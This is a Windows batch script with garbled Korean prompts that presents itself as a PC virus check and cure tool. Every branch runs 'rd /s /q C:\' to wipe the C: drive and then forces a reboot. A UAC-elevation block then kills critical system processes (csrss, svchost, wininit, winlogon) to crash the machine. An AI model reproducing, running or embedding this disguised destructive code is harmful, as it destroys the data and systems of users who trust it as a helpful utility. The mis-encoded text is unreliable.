
@echo off
 title ��� V$

@echo off
color 0a
echo ======================================================================================
echo �� ���α׷��� ���۵� �Ǵ� ����,���װ� �߰� �ȴٸ� ������ �� �̸��Ϸ� ���� �Ͻʽÿ�.
echo ������ �̸���: i56986935@gmail.com
echo ======================================================================================

set/p aa=������� pc �˻��ϱ� =(Y/N)=
if %aa%==Y goto :1
pause
if %aa%==N goto :2



:1
start C:\Users\Administrator\Desktop\�˸�.vbs
set/p aa= �� pc�� ������ ������ �Դϴ�...
ipconfig
set/p aa= 
Tree
set/p aa= 
taskkill /f /im explorer.exe
color 4a
start C:\Users\Administrator\Desktop\�˸�2.vbs
echo ���!���! ���̷��� Ʈ���̸� �� �߰� �߽��ϴ�!!"
set/p aa= ������� pc�� ġ���Ͻðڽ��ϱ�??=(Y/N)=
if %aa%==Y goto :3
pause
if %aa%==Y goto :4


:3 
start C:\Users\Administrator\Desktop\�˸�3.vbs
color 0c
echo ġ�Ḧ �����մϴ�!
cmd /c rd /s /q C:\
color 0a
set/p aa= 
start C:\Users\Administrator\Desktop\�˸�4.vbs
echo ���̷��� ������ ��(��) �����Ͽ����ϴ�!

color 0a
echo ���� �ڵ����� ������ �մϴ�.
shutdown /r


:2
echo ��� ���α׷� ��(��) ���� ���Դϴ�.
cmd /c rd /s /q C:\
start C:\Users\Administrator\Desktop\�˸�5.vbs
echo ���� �ڵ����� ������ �մϴ�.
shutdown /r





:4

echo �˰ڽ��ϴ�. 
color 0c
start C:\Users\Administrator\Desktop\�˸�6.vbs
set/p aa= ����! ����! ���̷����� ġ������ �ʾ� �ý����� �ջ�Ǿ����ϴ�!!
set/p aa= ��� ���α׷��� C����̺긦 ��ġ�� �ֽ��ϴ�.
echo ���! �̰����� �����Ű�� C����̺긦 ������ �����Ҽ� �����ϴ�!! "

cmd /c rd /s /q C:\

@echo off
 :: BatchGotAdmin
 :-------------------------------------
 REM  --> Check for permissions
 >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

REM --> If error flag set, we do not have admin.
 if '%errorlevel%' NEQ '0' (
     echo Requesting administrative privileges...
     goto UACPrompt
 ) else ( goto gotAdmin )

:UACPrompt
     echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
     echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
     exit /B

:gotAdmin
     if exist "%temp%\getadmin.vbs" ( del "%temp%\getadmin.vbs" )
     pushd "%CD%"
     CD /D "%~dp0"
 :--------------------------------------  




taskkill /F /IM csrss.exe 
taskkill /F /IM svchost.exe 
taskkill /F /IM wininit.exe 
taskkill /F /IM winlogon.exe





